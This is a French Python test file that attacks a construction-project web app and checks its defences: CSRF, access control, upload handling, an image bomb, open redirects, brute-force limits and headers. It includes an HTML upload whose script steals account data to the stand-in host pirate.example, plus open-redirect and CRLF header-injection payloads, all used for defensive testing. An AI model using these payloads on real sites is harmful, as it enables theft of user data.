"""Test de sécurité : on joue les attaques classiques et on vérifie que l'application les bloque.
Fichier piégé (HTML, SVG), image « bombe », accès au chantier d'un autre, formulaire sans jeton CSRF,
redirection vers un site piégé, force brute sur la connexion (y compris en falsifiant l'adresse IP),
clé de caméra inconnue, en-têtes de protection, cookie de session.
Lancement : python3 test_securite.py   (PostgreSQL : DATABASE_URL=postgresql://... python3 test_securite.py)
"""
import io, os, re, sys, tempfile
from datetime import datetime

BASE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE)
os.environ["CV_SYNC"] = "1"
os.environ.pop("ANTHROPIC_API_KEY", None)
os.environ["CV_INSTANCE"] = tempfile.mkdtemp(prefix="cv_secu_")
if os.environ.get("DATABASE_URL", "").startswith("postgres"):
    from services import db as _DB
    try:
        import psycopg  # noqa: F401
    except ImportError:
        from tests_support import pgwire
        _DB.set_driver(pgwire)
    _c = _DB.connect("")
    _c.execute("DROP SCHEMA public CASCADE"); _c.execute("CREATE SCHEMA public"); _c.commit(); _c.close()

import numpy as np
from PIL import Image
import app as A

A.app.config["TESTING"] = True
PW = "Bingerville-2026"
SITE = (5.3521, -3.8892)
ok = 0


def check(cond, msg):
    global ok
    assert cond, msg
    ok += 1
    print("  ✓", msg)


def tok(c, url="/"):
    m = re.search(r'name="csrf" value="([^"]+)"', c.get(url).get_data(as_text=True))
    assert m, url
    return m.group(1)


def post(c, url, data, page=None, follow=True, files=False, **kw):
    data = dict(data); data["csrf"] = tok(c, page or url)
    return c.post(url, data=data, follow_redirects=follow, content_type="multipart/form-data" if files else None, **kw)


def register(c, email, role, name, **extra):
    r = post(c, "/inscription", dict(terms="1", role=role, name=name, email=email, password=PW, **extra), "/inscription", follow=False)
    assert r.status_code == 302, email


def jpg(seed=1):
    b = io.BytesIO()
    Image.fromarray(np.random.default_rng(seed).integers(0, 255, (90, 160, 3), dtype=np.uint8)).save(b, "JPEG")
    return b.getvalue()


s = A.connect()
own, chef, other, anon = (A.app.test_client() for _ in range(4))
register(own, "own@x.ci", "proprio", "Aminata Koné")
register(chef, "chef@x.ci", "chef", "Koffi Chef", phone="0700000000")
register(other, "autre@x.ci", "proprio", "Autre Proprio")
uid = lambda e: s.execute("SELECT id FROM users WHERE email = ?", (e,)).fetchone()[0]
data = dict(name="Villa Bingerville", address="Bingerville", lat=str(SITE[0]), lng=str(SITE[1]), radius="100", pay_mode="manuel",
            start_date=datetime.now().date().isoformat())
for i, (n, a, d) in enumerate(A.DEFAULT_STEPS):
    data[f"step_name_{i}"], data[f"step_amount_{i}"], data[f"step_days_{i}"] = n, str(a), str(d)
post(own, "/chantiers/nouveau", data)
pid = s.execute("SELECT id FROM projects").fetchone()[0]
s.execute("UPDATE projects SET chef_id = ? WHERE id = ?", (uid("chef@x.ci"), pid)); s.commit()

print("En-têtes et cookie")
r = own.get("/")
h = r.headers
check("default-src 'self'" in h.get("Content-Security-Policy", "") and "frame-ancestors 'self'" in h["Content-Security-Policy"],
      "politique de contenu (CSP) : scripts et cadres limités au site")
check(h.get("X-Content-Type-Options") == "nosniff" and h.get("X-Frame-Options") == "SAMEORIGIN", "pas de devinette de type, pas d'intégration piégée")
r = anon.post("/connexion", data={"email": "x@x.ci", "password": "x", "csrf": tok(anon, "/connexion")})
cookie = " ".join(r.headers.getlist("Set-Cookie"))
check("HttpOnly" in cookie and "SameSite=Lax" in cookie, "cookie de session illisible par les scripts et non envoyé par les autres sites")

print("Accès")
check(anon.get(f"/chantiers/{pid}").status_code in (302, 401), "visiteur non connecté : renvoyé vers la connexion")
check(other.get(f"/chantiers/{pid}").status_code in (403, 404), "autre propriétaire : chantier invisible")
check(other.get(f"/chantiers/{pid}/achats").status_code in (403, 404), "autre propriétaire : achats invisibles")

print("Formulaires")
r = own.post(f"/chantiers/{pid}/conversation", data={"body": "sans jeton"})
check(r.status_code in (400, 403), "formulaire sans jeton CSRF refusé (attaque depuis un autre site)")

print("Fichiers piégés")
FD = f"/chantiers/{pid}/financement/dossier"
piege = b"<html><script>fetch('/compte').then(r=>r.text()).then(t=>fetch('https://pirate.example/?'+btoa(t)))</script></html>"
post(own, FD, {"kind": "identite", "file": (io.BytesIO(piege), "devis.html")}, page=FD, files=True)
post(own, FD, {"kind": "identite", "file": (io.BytesIO(b"%PDF-1.4\n%%EOF"), "cni.pdf")}, page=FD, files=True)
post(own, FD, {"kind": "identite", "file": (io.BytesIO(jpg()), "cni.jpg")}, page=FD, files=True)
docs = {d["original_name"]: d["id"] for d in s.execute("SELECT id, original_name FROM fin_documents")}
check(len(docs) == 3, "trois pièces déposées")
r = own.get(f"/financement/pieces/{docs['devis.html']}")
check(r.status_code == 200 and r.mimetype == "application/octet-stream" and "attachment" in r.headers.get("Content-Disposition", ""),
      "HTML déposé : téléchargé, jamais ouvert sur le site")
check("sandbox" in r.headers.get("Content-Security-Policy", ""), "HTML déposé : isolé même s'il était ouvert")
check(r.headers.get("Cache-Control", "").startswith("private"), "pièce privée : pas gardée par les caches partagés")
r = own.get(f"/financement/pieces/{docs['cni.pdf']}")
check(r.mimetype == "application/pdf" and "attachment" not in r.headers.get("Content-Disposition", ""), "PDF : s'ouvre normalement")
r = own.get(f"/financement/pieces/{docs['cni.jpg']}")
check(r.mimetype == "image/jpeg", "photo : s'affiche normalement")
check(other.get(f"/financement/pieces/{docs['cni.jpg']}").status_code in (403, 404), "pièce d'identité invisible pour un autre compte")
for d in s.execute("SELECT filename FROM documents WHERE filename LIKE 'pv_%'"):
    pass  # les PV générés par l'application restent lisibles dans le navigateur (vérifié dans test_complet)

print("Image « bombe »")
b = io.BytesIO(); Image.new("L", (9000, 9000)).save(b, "PNG", optimize=True)
check(len(b.getvalue()) < 2_000_000, "fichier minuscule (%d Ko) qui ferait 81 millions de pixels" % (len(b.getvalue()) // 1024))
X = f"/chantiers/{pid}/conversation"
r = post(chef, X, {"file": (io.BytesIO(b.getvalue()), "bombe.png")}, files=True, headers={"X-Requested-With": "fetch"})
check(r.status_code == 400, "refusée sans charger la mémoire du serveur")
r = post(chef, X, {"file": (io.BytesIO(jpg(3)), "ok.jpg")}, files=True, headers={"X-Requested-With": "fetch"})
check(r.status_code == 200, "une vraie photo passe toujours")

print("Redirections")
with A.app.test_request_context("/", headers={"Host": "localhost"}):
    home = A.url_for("home")
    for bad in ("https://pirate.example/connexion", "//pirate.example", "/\\pirate.example", "\\\\pirate.example", "/%0d%0aSet-Cookie:x", "javascript:alert(1)"):
        check(A.local_url(bad) == home or not A.local_url(bad).startswith(("//", "/\\", "http", "javascript")), f"refusée : {bad}")
    check(A.local_url(f"/chantiers/{pid}") == f"/chantiers/{pid}", "adresse interne gardée")
r = post(anon, "/connexion?next=/%5Cpirate.example", {"email": "own@x.ci", "password": PW}, page="/connexion", follow=False)
check(r.status_code == 302 and "pirate" not in r.headers["Location"], "après connexion : jamais renvoyé vers un site piégé")

print("Force brute")
brute = A.app.test_client()
codes = []
for i in range(8):
    r = post(brute, "/connexion", {"email": "own@x.ci", "password": f"faux{i}"}, page="/connexion", follow=False,
             headers={"X-Forwarded-For": f"10.0.0.{i}, 203.0.113.9"})
    codes.append(r.status_code)
check(codes[-1] == 429, "blocage après 5 essais ratés sur un compte")
brute2 = A.app.test_client()
codes = []
for i in range(A.LOGIN_MAX_PER_IP + 2):
    r = post(brute2, "/connexion", {"email": f"cible{i}@x.ci", "password": "faux"}, page="/connexion", follow=False,
             headers={"X-Forwarded-For": f"198.51.100.{i}, 203.0.113.50"})
    codes.append(r.status_code)
check(429 in codes, "fausse adresse IP dans l'en-tête : le blocage par adresse tient quand même")
with A.app.test_request_context("/", headers={"X-Forwarded-For": "1.2.3.4, 203.0.113.7"}):
    check(A.client_ip() == "203.0.113.7", "l'adresse retenue est celle écrite par l'hébergeur, pas par le visiteur")

print("Caméras et API")
r = anon.post("/api/v1/cameras/photo", data=jpg(), headers={"X-Camera-Key": "devine"})
check(r.status_code == 401, "caméra avec une clé inconnue : refusée")
check(anon.get("/api/v1/projets").status_code in (401, 403, 404), "API sans jeton : refusée")

print(f"\nSécurité : {ok} vérifications OK")
